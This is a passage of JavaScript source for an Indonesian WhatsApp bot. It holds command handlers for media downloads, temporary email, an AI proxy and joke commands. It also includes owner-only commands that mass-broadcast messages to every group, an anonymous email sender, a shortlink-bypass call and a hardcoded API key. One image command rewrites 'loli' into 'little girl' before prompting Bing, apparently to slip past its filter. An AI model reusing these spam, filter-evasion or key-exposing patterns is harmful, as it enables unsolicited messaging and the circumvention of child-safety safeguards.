const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await luna.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* testimoni Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await luna.sendMessage(i, {
  footer: `© 2026 ${botname}`,
    buttons: [
    {
    buttonId: ".owner", buttonText: { displayText: "Owner" }, type: 1 
       }
   ],
  headerType: 1,
  viewOnce: true,
  image: await fs.readFileSync(rest), 
  caption: `\n${teks}\n`,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }
  },
}, {quoted: qtoko})
count += 1
} catch {}
await new Promise((r) => setTimeout(r, 10000));
}
await fs.unlinkSync(rest)
await luna.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

case "skiplink": {
    if (!text) return m.reply(`Contoh : .skiplink https://sub4unlock.co/S9oU0`);
    m.reply('wett')
    try {
        let api = `https://fgsi.koyeb.app/api/tools/skip/sub4unlock?apikey=APIKEY&url=${encodeURIComponent(text)}`;
        let { data: json } = await axios.get(api);

        if (!json.status || !json.data?.linkGo) {
            return m.reply('Lu masukin url apa tu woy 😂');
        }

        await m.reply(`${json.data.linkGo}`);
    } catch (err) {
        m.reply(`Eror kak : ${err.message}`)
    }
};
break

const fb = async (urlFesnuk) => {
    if (typeof urlFesnuk !== "string") throw Error(`mana url nya`)
    const r = await fetch("https://fdown.net/download.php", {
        method: "POST",
        headers: { "content-type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({ URLz: urlFesnuk })
    })
    if (!r.ok) {
        const txt = await r.text()
        throw Error(`${r.status} ${r.statusText} ${(txt || `(respond body kosong)`).substring(0, 100)}`)
    }
    const html = await r.text()
    const hd = html.match(/id="hdlink" href="(.+?)" download/)?.[1]?.replaceAll("&amp;", "&")
    const sd = html.match(/id="sdlink" href="(.+?)" download/)?.[1]?.replaceAll("&amp;", "&")
    if (!hd && !sd) throw Error(`tidak ada video yang bisa di download`)
    return { hd, sd }
}

case "fb": {
    if (!text) return m.reply(`Contoh : .fb https://www.facebook.com/share/v/...`)
    m.reply('wett')
    try {
        const { hd, sd } = await fb(text)
        const videoUrl = hd || sd
        await luna.sendFile(m.chat, videoUrl, '_zenwik.mp4', '', m)
    } catch (e) {
        m.reply(`Eror kak : ${e.message}`)
    }
}
break

case "metaai": {
    if (!text) return m.reply("*Contoh:* .metaai Apa itu JavaScript?");
    Reply(mess.wait);
    try {
        const apiUrl = `https://api.siputzx.my.id/api/ai/metaai?query=${encodeURIComponent(q)}`;
        const response = await axios.get(apiUrl);
        const data = response.data;
        
        if (data.status && data.data) {
            await m.reply(`*Meta AI*\n\n${data.data}`);
        } else {
            Reply("❌ Gagal mendapatkan respons dari Meta AI");
        }
    } catch (error) {
        console.error("Meta AI Error:", error);
        Reply(mess.error);
    }
}
break

case "pindown": {
try {

if (!text) {
return m.reply(
`📌 Contoh:

.pindown https://pin.it/2xc4pVU2g`
)
}

await m.reply("⏳ Sedang mengambil media Pinterest...")

const axios = require("axios")

const { data } = await axios.get(
`https://api.azbry.com/api/download/pinterest?url=${encodeURIComponent(text)}`
)

if (!data.status || !data.result) {
return m.reply("❌ Gagal mengambil data Pinterest")
}

const res = data.result

let caption = `📌 *PINTEREST DOWNLOADER*\n\n`
caption += `📝 Judul : ${res.title || "(no title)"}\n`
caption += `👤 User : ${res.user?.fullName || "-"}\n`
caption += `🏷 Username : ${res.user?.username || "-"}\n`
caption += `❤️ Likes : ${res.stats?.likes || 0}\n`
caption += `🔁 Shares : ${res.stats?.shares || 0}\n`
caption += `💬 Komentar : ${res.stats?.comments || 0}\n`
caption += `🎬 Tipe : ${res.type || "-"}\n`

if (res.type === "video" && res.download) {

let videoUrl = String(res.download)
.replace(/\\\//g, "/")
.trim()

try {

const vid = await axios.get(videoUrl, {
responseType: "arraybuffer",
headers: {
"User-Agent": "Mozilla/5.0"
}
})

await luna.sendMessage(
m.chat,
{
video: Buffer.from(vid.data),
mimetype: "video/mp4",
caption
},
{
quoted: m
}
)

} catch {

await luna.sendMessage(
m.chat,
{
video: {
url: videoUrl
},
caption
},
{
quoted: m
}
)

}

} else if (res.images && res.images.length > 0) {

let imageUrl = String(res.images[0])
.replace(/\\\//g, "/")
.trim()

await luna.sendMessage(
m.chat,
{
image: {
url: imageUrl
},
caption
},
{
quoted: m
}
)

} else if (res.thumbnail) {

let thumbUrl = String(res.thumbnail)
.replace(/\\\//g, "/")
.trim()

await luna.sendMessage(
m.chat,
{
image: {
url: thumbUrl
},
caption
},
{
quoted: m
}
)

} else {

m.reply("❌ Media tidak ditemukan")

}

} catch (e) {
console.log(e)

m.reply(
`❌ Error:\n${e?.response?.data?.message || e?.message || e}`
)
}
}
break

case 'capcut': {
  try {
    if (!args[0]) return m.reply('*Example :* .capcut https://www.capcut.com/tv2/ZSDrUV5e8/')
 
    let { data } = await axios.post('https://3bic.com/api/download', { url: args[0] }, {
      headers: {
        accept: 'application/json, text/plain, */*',
        'content-type': 'application/json'
      }
    })
 
    let base64url = data?.originalVideoUrl?.split('/api/cdn/')[1]
    let video = Buffer.from(base64url, 'base64').toString()
 
    await luna.sendMessage(m.chat, { video: { url: video } }, { quoted: m })
  } catch (e) {
    m.reply(e.message)
  }
}
break

case 'ytmp2': {
 try { if (!args[0]) return m.reply(`Gunakan: ${usedPrefix + command} <url>`)
 
await luna.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
 
let url = `https://www.sankavollerei.com/download/ytmp3?apikey=planaai&url=${encodeURIComponent(args[0])}`
let res = await axios.get(url)
let json = res.data
 
if (!json.status) return m.reply(`❌ Gagal mengambil data dari API`)
 
let { title, thumbnail, download, duration } = json.result
 
await luna.sendMessage(m.chat, {
  audio: { url: download },
  mimetype: 'audio/mpeg',
  fileName: `${title}.mp3`,
}, { quoted: m })
 
} catch (err) { m.reply(`❌ Error\nLogs error : ${err.message}`) } }
break

case 'play': {
  if (!text) return m.reply(`Example: ${prefix + command} Lagu sad`);
  try {		
    let search = await yts(`${text}`);
    if (!search || search.all.length === 0) return m.reply(`*Lagu tidak ditemukan!* ☹️`);
    let { videoId, image, title, views, duration, author, ago, url, description } = search.all[0];
    let caption = `「 *YOUTUBE PLAY* 」\n\n🆔 ID : ${videoId}\n💬 Title : ${title}\n📺 Views : ${views}\n⏰ Duration : ${duration.timestamp}\n▶️ Channel : ${author.name}\n📆 Upload : ${ago}\n🔗 URL Video : ${url}`;
    
    await luna.sendMessage(m.chat, {
      image: { url: image },
      caption: caption,
      footer: `${global.namaOwner}`,
      buttons: [
        {
         buttonId: `${prefix}ytmp3 ${url}`, buttonText: { displayText: "Audio" }, type: 1 
        },
       {
         buttonId: `${prefix}ytmp3 ${url}`, buttonText: { displayText: "Audio" }, type: 1 
        }
      ],
      headerType: 1,
      viewOnce: true,
      contextInfo: {
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: global.idSaluran,
          newsletterName: global.namaSaluran
        }
      }
    }, { quoted: m });
  } catch (err) {
    console.error(err);
    m.reply(`*Terjadi kesalahan!* 😭\n${err.message || err}`);
  }
}
break

case 'upch': case 'upchannel':
case 'sendch': {
    if (!isOwner) return reply(mess.owner);
    const Lunasender = m.key.remoteJid;
    const name = luna.getName ? await luna.getName(Lunasender) : 'kamu';
    const targetChannel = targetChannelData.id;   
    if (!text && !(quoted && quoted.message)) {
        return m.reply(`Cara penggunaan *${prefix}upch*:\n\n` +
            `1. Balas media (foto/video/sticker/audio/dokumen) + ketik *${prefix}upch* untuk kirim media ke channel.\n\n` +
            `*Note:*\n` +
            `Sebelum pakai, pastikan sudah set target channel pakai perintah *${prefix}setch 120xxxx@newsletter*\n\n` +
            `> Luna-MD`);
    }
    luna.sendMessage(m.chat, { react: { text: '??', key: m.key } });
    const contentText = text?.trim();
    const ppuser = await getBuffer(await luna.profilePictureUrl(m.sender, 'image').catch(() => 'https://img1.pixhost.to/images/8534/638498350_rafaofficial.jpg'));
    const ctx = {
        mentionedJid: [m.sender],
        forwardingScore: 9999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: targetChannel,
            serverMessageId: 20,
            newsletterName: `${global.namaSaluran}`
        },
        externalAdReply: {
            title: `⭐ Pesan dari ${name}`,
            body: `Runtime: ${runtime(process.uptime())} ⚙️`,
            thumbnail: ppuser,
            mediaType: 1,
            sourceUrl: `${global.source}`
        }
    };
    const isQuoted = quoted && quoted.message;
    if (isQuoted) {
        const type = Object.keys(quoted.message)[0];
        const media = await luna.downloadAndSaveMediaMessage(quoted);
        const fileName = quoted?.fileName || 'File.unknown';
        switch (type) {
            case 'imageMessage':
                await luna.sendMessage(targetChannel, { image: { url: media }, caption: contentText || '', contextInfo: ctx });
                break;
            case 'videoMessage':
                await luna.sendMessage(targetChannel, { video: { url: media }, caption: contentText || '', contextInfo: ctx });
                break;
            case 'audioMessage':
                await luna.sendMessage(targetChannel, { audio: { url: media }, mimetype: 'audio/mp4', ptt: quoted.message.audioMessage?.ptt || false, contextInfo: ctx });
                break;
            case 'stickerMessage':
                await luna.sendMessage(targetChannel, { sticker: { url: media }, contextInfo: ctx });
                break;
            case 'documentMessage':
                await luna.sendMessage(targetChannel, { document: { url: media }, mimetype: quoted.mimetype || 'application/octet-stream', fileName: fileName, contextInfo: ctx });
                break;
            default:
                await luna.sendMessage(targetChannel, { document: { url: media }, mimetype: 'application/octet-stream', fileName: fileName, contextInfo: ctx });
                break;
        }
    } else if (contentText) {
        await luna.sendMessage(targetChannel, { text: contentText, contextInfo: ctx });
    }
    luna.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
}
break

case 'iqc': {
if (!text) return reply('gunakan : .iqc jam|batre|pesan\ncontoh : .iqc 18:00|40|hai hai');

  let [time, battery, ...msg] = text.split('|')
  if (!time || !battery || msg.length === 0) throw 'format salahh gunakan :\n.iqc jam|batre|pesan\nContoh:\n.iqc 18:00|40|hai hai'

await Reply('Tunggu Sbntr.');

  let messageText = encodeURIComponent(msg.join('|').trim())
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&batteryPercentage=${battery}&carrierName=INDOSAT%20OREDOO&messageText=${messageText}&emojiStyle=apple`

  let res = await fetch(url)
  if (!res.ok) throw 'gagal fetch url'

  let buffer = await res.buffer()
  await luna.sendMessage(m.chat, { image: buffer }, { quoted: m })
}
break

case 'cekkalender': case 'createkalender': {
    let args = text.split(' ');
    if (args.length < 2) return reply('Format salah! Gunakan: ckalender bulan tahun');
    let month = args[0];
    let year = args[1];
    if (isNaN(month) || isNaN(year)) return m.reply('Bulan dan tahun harus berupa angka!');
    let apiUrl = `https://fastrestapis.fasturl.cloud/maker/calendar/simple?month=${month}&year=${year}`;
    luna.sendMessage(m.chat, { image: { url: apiUrl }, caption: `Kalender bulan ${month} tahun ${year}` }, { quoted: m });
    }
    break

case "jpm": {
if (!isOwner) return reply(mess.owner)
if (!q) return m.reply(example("teksnya"))
let allgrup = await luna.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
const teks = text
await m.reply(`Memproses *jpm* teks Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await luna.sendMessage(i, {text: `${teks}`}, {quoted: qlocJpm})
count += 1
} catch {}
   await new Promise((r) => setTimeout(r, 10000));
}
await luna.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: qloc})
}
break

case 'cekganteng':
case 'cekcantik': {
  const teks = text ? text.trim() : ''
  let targetJid
  let targetName
  if (m.mentionedJid && m.mentionedJid.length > 0) {
    targetJid = m.mentionedJid[0]
    targetName = await luna.getName(targetJid)
  } else if (/^\d{5,}$/.test(teks)) {
    targetJid = teks.includes('@s.whatsapp.net') ? teks : teks + '@s.whatsapp.net'
    targetName = await luna.getName(targetJid).catch(() => teks)
  } else if (teks) {
    targetJid = m.sender
    targetName = teks
  } else {
    targetJid = m.sender
    targetName = await luna.getName(m.sender)
  }
  const score = Math.floor(Math.random() * 100) + 1
  let komentar, emoji
  if (command == 'cekganteng') {
    if (score >= 90) {
      komentar = 'Gantengnya overload! Bikin cewek-cewek auto salfok!'
      emoji = '🔥👑💯'
    } else if (score >= 75) {
      komentar = 'Fix calon idol K-Pop, visualnya ngalahin artis!'
      emoji = '✨🧸💘'
    } else if (score >= 60) {
      komentar = 'Lumayanlah, bisa jadi cover boy majalah sekolah.'
      emoji = '😎??'
    } else if (score >= 40) {
      komentar = 'Masih bisa ganteng... asal pake lighting dan filter 10 lapis.'
      emoji = '🤔??📸'
    } else if (score >= 20) {
      komentar = 'Gantengnya kayak sinyal 1 bar di hutan.'
      emoji = '📵🌲😂'
    } else {
      komentar = 'Waduh... Gantengnya disembunyiin kali ya?'
      emoji = '🥲💀👻'
    }
    const result = `*Cek Ganteng Untuk:* ${targetName}\n\n` +
                   `*Nilai Ganteng:* *${score}/100* ${emoji}\n\n` +
                   `*Komentar:* ${komentar}`
    luna.sendMessage(m.chat, {
      text: result,
      mentions: [targetJid],
    }, { quoted: m })
  } else if (command == 'cekcantik') {
    if (score >= 90) {
      komentar = 'Kecantikannya bikin bunga iri dan rembulan minder.'
      emoji = '🌷✨🌙'
    } else if (score >= 75) {
      komentar = 'Manisnya kayak senja di tepi pantai, adem banget dipandang.'
      emoji = '🌅🍬??'
    } else if (score >= 60) {
      komentar = 'Pesonanya sederhana tapi ngena, kayak kopi di pagi hari.'
      emoji = '☕🌼😊'
    } else if (score >= 40) {
      komentar = 'Cantik sih... tapi kayak koneksi WiFi, kadang ada kadang hilang.'
      emoji = '📶🤏??'
    } else if (score >= 20) {
      komentar = 'Mungkin cantiknya perlu di-update ke versi terbaru.'
      emoji = '??🤖🫣'
    } else {
      komentar = 'Kecantikannya kayak teka-teki, masih misteri.'
      emoji = '🕵️‍♀️❓🌑'
    }
    const result = `*Cek Cantik Untuk:* ${targetName}\n\n` +
                   `*Skor Kecantikan:* *${score}/100* ${emoji}\n\n` +
                   `*Komentar:* ${komentar}`
    luna.sendMessage(m.chat, {
      text: result,
      mentions: [targetJid],
    }, { quoted: m })
  }
}
break

case "jpm2": {
    if (!isOwner) return m.reply(mess.owner);
    if (!q) return reply(example("*teks dengan mengirim video*"));
    if (!/video/.test(mime)) return reply(example("teks dengan mengirim video"));
    
    const allgrup = await luna.groupFetchAllParticipating();
    const res = await Object.keys(allgrup);
    let count = 0;
    const teks = text;
    const jid = m.chat;
    const rest = await luna.downloadAndSaveMediaMessage(qmsg);
    
    await m.reply(`*Memproses jpm teks & video ke ${res.length} grup*`);
    
    for (let i of res) {
        
        if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue;
        try {
            
            await luna.sendMessage(i, { video: fs.readFileSync(rest), caption: teks }, { quoted: qlocJpm });
            count += 1;
        } catch {}
        await sleep(global.delayJpm); 
    }
    
    await fs.unlinkSync(rest); 
    await luna.sendMessage(jid, { text: `*JPM Sukses dikirim*\n*Total grup yang berhasil dikirim pesan : ${count}*` }, { quoted: m });
}
break;

case "bersihbot": {
const dirsesi = fs.readdirSync("./session").filter(e => e !== "creds.json")
const dirsampah = fs.readdirSync("./library/database/sampah").filter(e => e !== "A")
for (const i of dirsesi) {
await fs.unlinkSync("./session/" + i)
}
for (const u of dirsampah) {
await fs.unlinkSync("./library/database/sampah/" + u)
}
m.reply(`*Berhasil membersihkan sampah ✅*
*${dirsesi.length}* sampah session\n*${dirsampah.length}* sampah file`)
}
break

            case "bingimg-2d": {
                if (!text) return reply("[ ! ] masukan prompt gambar yang mau di bikin");
                let teksu = text.replace(/loli/gi, "anak gadis kecil");
                try {
                    const {
                        BingApi,
                        apikeybing
                    } = require('./lib/bing-image.js');
                    const bingApi = new BingApi(apikeybing);
                    const imagesUrls = await bingApi.createImages(teksu + ". Anime Style ultra, HD Anime Style, 4K Anime Style, Anime Style, High quality, Ultra grapics, HD Cinematic, anime, 4K resolution, HD quality, Ultra CGI, High quality, Ultra grapics, HD Cinematic", false);
                    const totalCount = imagesUrls.length;
                    const credits = await bingApi.getCredits();

                    if (totalCount > 0) {
                        for (let i = 0; i < totalCount; i++) {
                            try {
                                await new Promise(resolve => setTimeout(resolve, i * 6000));
                                luna.sendMessage(m?.chat, {
                                    image: {
                                        url: imagesUrls[i]
                                    },
                                    caption: `Image *(${i + 1}/${totalCount})*\n\nRemaining Credits: ${credits}\nPrompt: ${text}`
                                }, {
                                    quoted: m
                                });
                            } catch (error) {
                                console.error(`Error sending file: ${error.message}`);
                                await m.reply(`Failed to send image *(${i + 1}/${totalCount})*`);
                            }
                        }
                    } else {
                        await Reply('No images found after filtering.');
                    }
                } catch (error) {
                    await Reply('An error occurred while processing the request.');
                }
            };
                break

case "swm": case "stickerwm": case "stikerwm": case "wm": {
if (!text) return m.reply(example("namamu dengan kirim media"))
if (!/image|video/gi.test(mime)) return m.reply(example("namamu dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await luna.downloadAndSaveMediaMessage(qmsg)
await luna.sendAsSticker(m.chat, image, m, {packname: text})
await fs.unlinkSync(image)
}
break

            case 'cekkhodam': case 'cekkodam': {
                if (!text) return reply("ketik nama mu")

                const khodam = pickRandom([
                    "Kaleng Cat Avian",
                    "Pipa Rucika",
                    "King Hitam",
                    "Lemari dua Pintu",
                    "Kacang Hijau",
                    "Kulkas mini",
                    "Burung beo",
                    "Air",
                    "Api",
                    "Batu",
                    "Magnet",
                    "Sempak",
                    "Botol Tupperware",
                    "Badut Mixue",
                    "Sabun GIV",
                    "Sandal Swallow",
                    "Jarjit",
                    "Ijat",
                    "Fizi",
                    "Mail",
                    "Ehsan",
                    "Upin",
                    "Ipin",
                    "sungut lele",
                    "Tok Dalang",
                    "Opah",
                    "Opet",
                    "Alul",
                    "Pak Vinsen",
                    "Maman Resing",
                    "Pak RT",
                    "Admin ETI",
                    "Bung Towel",
                    "Lumpia Basah",
                    "Bjorka",
                    "Hacker",
                    "Martabak Manis",
                    "Baso Tahu",
                    "Tahu Gejrot",
                    "Dimsum",
                    "Seblak",
                    "Aromanis",
                    "Gelembung sabun",
                    "Kuda",
                    "Seblak Ceker",
                    "Telor Gulung",
                    "Tahu Aci",
                    "Tempe Mendoan",
                    "Nasi Kucing",
                    "Kue Cubit",
                    "Tahu Sumedang",
                    "Nasi Uduk",
                    "Wedang Ronde",
                    "Kerupuk Udang",
                    "Cilok",
                    "Cilung",
                    "Kue Sus",
                    "Jasuke",
                    "Seblak Makaroni",
                    "Sate Padang",
                    "Sayur Asem",
                    "Kromboloni",
                    "Marmut Pink",
                    "Belalang Mullet",
                    "Kucing Oren",
                    "Lintah Terbang",
                    "Singa Paddle Pop",
                    "Macan Cisewu",
                    "Vario Mber",
                    "Beat Mber",
                    "Supra Geter",
                    "Oli Samping",
                    "Knalpot Racing",
                    "Jus Stroberi",
                    "Jus Alpukat",
                    "Alpukat Kocok",
                    "Es Kopyor",
                    "Es Jeruk",
                    "@whiskeysockets/baileys",
                    "chalk",
                    "gradient-string",
                    "@adiwajshing",
                    "d-scrape",
                    "undefined",
                    "cannot read properties",
                    "performance-now",
                    "os",
                    "node-fetch",
                    "form-data",
                    "axios",
                    "util",
                    "fs-extra",
                    "scrape-primbon",
                    "child_process",
                    "emoji-regex",
                    "check-disk-space",
                    "perf_hooks",
                    "moment-timezone",
                    "cheerio",
                    "fs",
                    "process",
                    "require( . . . )",
                    "import ... from ...",
                    "rate-overlimit",
                    "Cappucino Cincau",
                    "Jasjus Melon",
                    "Teajus Apel",
                    "Pop ice Mangga",
                    "Teajus Gulabatu",
                    "Air Selokan",
                    "Air Kobokan",
                    "TV Tabung",
                    "Keran Air",
                    "Tutup Panci",
                    "Kotak Amal",
                    "Tutup Termos",
                    "Tutup Botol",
                    "Kresek Item",
                    "Kepala Casan",
                    "Ban Serep",
                    "Kursi Lipat",
                    "Kursi Goyang",
                    "Kulit Pisang",
                    "Warung Madura",
                    "Gorong-gorong",
                ])
                const response = `Khodam mu adalah: *${khodam}*`
                m.reply(response)
            }
                break

case 'totalfitur': {
    try {
        let total = totalfitur();
        Reply(`*Total fitur aktif saat ini:* ${total} fitur!`);
    } catch (e) {
        Reply(`Gagal membaca total fitur:\n${e.message}`);
    }
}
break

case 'ytmp3': {
    try {
        if (!text.includes('youtu')) return m.reply(command === "ytmp3" ? '⚠️ Masukan Link YouTube\n\n.ytmp3 <link>' : '⚠️ Masukan Link YouTube atau format,\n\n.ytmp4 <link>, <format>')

        const isVideo = command === "ytmp4" ? true : false;

        let ok;
        if (isVideo) {
            const [link, f] = text.split(', ');
            const format = f || 720
            const t = ["144", "240", "360", "720", "1080"];
            if (!t.includes(format)) return m.reply(`⚠️Format Tersedia: ${t.map((a) => a).join(', ')}`);

            ok = {
                url: link,
                mode: "mp4",
                type: format
            };
        } else {
            ok = {
                url: text,
                mode: 'mp3',
                type: 128
            };
        };

        const res = await oceansaver(ok);
        if (isVideo) {
            const {
                data: buffer
            } = await axios.get(res.url, {
                responseType: 'arraybuffer'
            })
            if (buffer.length > 1024 * 1024 * 30) {
                luna.sendMessage(m.chat, {
                    document: buffer,
                    mimetype: 'video/mp4',
                    fileName: encodeURIComponent(res.title) + '.mp4'
                }, {
                    quoted: m
                });
            } else {
                luna.sendMessage(m.chat, {
                    video: buffer,
                    mimetype: 'video/mp4',
                    fileName: encodeURIComponent(res.title) + '.mp4'
                }, {
                    quoted: m
                });
            }
        } else {
            const {
                data: buffer
            } = await axios.get(res.url, {
                responseType: 'arraybuffer'
            })
            if (buffer.length > 1024 * 1024 * 100) {
                luna.sendMessage(m.chat, {
                    document: buffer,
                    mimetype: 'audio/mpeg',
                    fileName: encodeURIComponent(res.title) + '.mp3'
                }, {
                    quoted: m
                });
            } else {
                luna.sendMessage(m.chat, {
                    audio: buffer,
                    mimetype: 'audio/mpeg',
                    fileName: encodeURIComponent(res.title) + '.mp3'
                }, {
                    quoted: m
                });
            }
        }
    } catch (e) {
        m.reply("❌ Gomene Error Mungkin lu kebanyakan request");
        console.error(e);
    }
}

async function oceansaver({
    url,
    mode = 'mp3',
    type = 128
}) {
    try {
        const {
            data: dl
        } = await axios.get('https://p.lbserver.xyz/ajax/download.php', {
            params: {
                copyright: '0',
                ...(mode === 'mp3' ? {
                    format: 'mp3',
                    audio_quality: String(type)
                } : {}),
                ...(mode === 'mp4' ? {
                    format: String(type)
                } : {}),
                url: url,
                api: '30de256ad09118bd6b60a13de631ae2cea6e5f9d'
            }

        })

        const prog = await new Promise((resolve, reject) => {
            let retries = 40;
            const interval = setInterval(async () => {
                const {
                    data: res
                } = await axios.get(dl.progress_url);
                if (!!res.success && res.progress >= 1e3) {
                    clearInterval(interval);
                    resolve({
                        status: true,
                        url: res.download_url,
                        ...(res.alternative_download_urls ? {
                            alternative: res.alternative_download_urls
                        } : {})
                    });
                }
                if (--retries <= 0) {
                    clearInterval(interval);
                    reject(new Error("Failed to fetch download URL."));
                }
            }, 1500);
        });
        return {
            status: true,
            ...dl.info,
            ...prog
        };
    } catch (e) {
        console.error({
            status: false,
            msg: e.message
        })
        return {
            status: false,
            msg: e.message
        }
    }
}
break

case 'binary':
case 'bin': {
  const teks = args.join(' ').trim();
  if (!teks) {
    return luna.sendMessage(m.chat, {
      text: `- Contoh penggunaan:\n${prefix}binary --teks "01001000"\n${prefix}binary --binarycode "Hello"`,
    }, { quoted: m });
  }

  try {
    const bintoteks = teks.startsWith('--teks');
    const tekstobin = teks.startsWith('--binarycode');
    if (!bintoteks && !tekstobin) {
      return luna.sendMessage(m.chat, {
        text: `- Tentukan mode konversi:\n--teks (binary ke text)\n--binarycode (text ke binary)`,
      }, { quoted: m });
    }
    const input = teks.split(' ').slice(1).join(' ').trim();
    if (!input) {
      return luna.sendMessage(m.chat, { text: 'Masukkan teks/binary yang valid' }, { quoted: m });
    }
    let hsil;
    if (bintoteks) {
      const cb = input.replace(/[^01 ]/g, '');
      if (!cb) throw new Error('Binary code tidak valid');
      const res = await fetch('https://www.magictool.ai/functions/BINARY-TEXT.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'Mozilla/5.0'
        },
        body: `input=${encodeURIComponent(cb)}`
      });
      hsil = await res.text();
      if (!res.ok || !hsil || hsil.includes('error')) {
        throw new Error('API gagal memproses');
      }
    } else {
      const res = await fetch('https://www.magictool.ai/functions/TEXT-BINARY.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'Mozilla/5.0'
        },
        body: `input=${encodeURIComponent(input)}`
      });
      hsil = await res.text();
      if (!res.ok || !hsil || hsil.includes('error')) {
        throw new Error('API gagal memproses');
      }
    }
    await luna.sendMessage(m.chat, { text: hsil }, { quoted: m });
  } catch (error) {
    console.error('Error:', error);
    luna.sendMessage(m.chat, {
      text: `Gagal mengkonversi: ${error.message}`,
    }, { quoted: m });
  }
}
break

case 'lemonmail': {
 const argsxx = text.split('|'); if (args.length < 3) return m.reply('Format salah! Gunakan: email|subject|pesan');
const [target, subject, message] = argsxx;
        m.reply('Mengirim email...');
        try {
            const data = JSON.stringify({ "to": target.trim(), "subject": subject.trim(), "message": message.trim() });
            const config = {
                method: 'POST',
                url: 'https://lemon-email.vercel.app/send-email',
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
                    'Content-Type': 'application/json',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
                    'sec-ch-ua-mobile': '?1',
                    'origin': 'https://lemon-email.vercel.app',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://lemon-email.vercel.app/',
                    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                    'priority': 'u=1, i'
                },
                data: data
            };
            const axios = require('axios');
            const api = await axios.request(config);
            m.reply(`Hasil: ${JSON.stringify(api.data, null, 2)}`);
        } catch (error) {
            m.reply(`Error: ${error.message}`);
        }
        }
        break
        
        case 'tempmail': {
 class TempMail {
 constructor() {
 this.cookie = null;
 this.baseUrl = 'https://tempmail.so';
 }

 async updateCookie(response) {
 if (response.headers['set-cookie']) {
 this.cookie = response.headers['set-cookie'].join('; ');
 }
 }

 async makeRequest(url) {
const axios = require('axios');
 const response = await axios({
 method: 'GET',
 url: url,
 headers: {
 'accept': 'application/json',
 'cookie': this.cookie || '',
 'referer': this.baseUrl + '/',
 'x-inbox-lifespan': '600',
 'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 'sec-ch-ua-mobile': '?1'
 }
 });

 await this.updateCookie(response);
 return response;
 }

 async initialize() {
const axios = require('axios');
 const response = await axios.get(this.baseUrl, {
 headers: {
 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
 'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"'
 }
 });
 await this.updateCookie(response);
 return this;
 }

 async getInbox() {
 const url = `${this.baseUrl}/us/api/inbox?requestTime=${Date.now()}&lang=us`;
 const response = await this.makeRequest(url);
 return response.data;
 }

 async getMessage(messageId) {
 const url = `${this.baseUrl}/us/api/inbox/messagehtmlbody/${messageId}?requestTime=${Date.now()}&lang=us`;
 const response = await this.makeRequest(url);
 return response.data;
 }
 }

 try {
 const mail = new TempMail();
 await mail.initialize();

 const inbox = await mail.getInbox();

 if (!inbox.data?.name) {
 throw new Error('Failed to get temporary email');
 }

 const emailInfo = `Temporary Email\n\n*Email :* ${inbox.data.name}\n *Expired :* 10 minutes\nInbox Status : ${inbox.data.inbox?.length || 0} Pesan\n\n> Email Akan Otomatis Dihapus Setelah 10 Menit`;
 await m.reply(emailInfo);

 const state = {
 processedMessages: new Set(),
 lastCheck: Date.now(),
 isRunning: true
 };

 const processInbox = async () => {
 if (!state.isRunning) return;

 try {
 const updatedInbox = await mail.getInbox();

 if (updatedInbox.data?.inbox?.length > 0) {
 const sortedMessages = [...updatedInbox.data.inbox].sort((a, b) =>
 new Date(b.date) - new Date(a.date));

 for (const message of sortedMessages) {
 if (!state.processedMessages.has(message.id)) {
 const messageDetail = await mail.getMessage(message.id);

 let cleanContent = messageDetail.data?.html
 ? messageDetail.data.html.replace(/<[^>]*>?/gm, '').trim()
 : 'No text content';

 const messageInfo = `_Ada Pesan Baru Nih_\n\nFrom : ${message.from || 'Anomali'}\n*Subject :* ${message.subject || 'No Subject'}\n\n*Pesan :*\n${cleanContent}`;

 await luna.sendMessage(m.chat, { text: messageInfo }, { quoted: m });
 state.processedMessages.add(message.id);
 }
 }
 }
 } catch (error) {
 console.error('Error:', error);
 }
 };

 await processInbox();

 const checkInterval = setInterval(processInbox, 10000);

 setTimeout(() => {
 state.isRunning = false;
 clearInterval(checkInterval);
 m.reply('Email Otomatis Di Hapus Setelah 10 Menit');
 }, 600000);

 } catch (error) {
 m.reply(`Error: ${error.message}`);
 }
}
 break

case 'animefind': {
  try {
    const quoted = m.quoted ? m.quoted : m
    const mime = (quoted.msg || quoted).mimetype || ''
    if (!/image/.test(mime)) return m.reply("Harap reply ke gambar yang mau dicari")
